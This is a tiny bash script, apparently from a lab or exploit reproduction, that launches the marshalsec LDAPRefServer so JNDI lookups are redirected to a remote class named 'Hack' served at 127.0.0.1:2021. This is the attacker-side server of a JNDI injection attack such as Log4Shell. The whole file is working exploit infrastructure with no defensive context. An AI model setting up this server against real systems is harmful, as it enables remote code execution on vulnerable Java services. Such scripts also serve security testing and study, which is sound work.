#!/usr/bin/env bash

java -cp \
  lib/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://127.0.0.1:2021/#Hack"
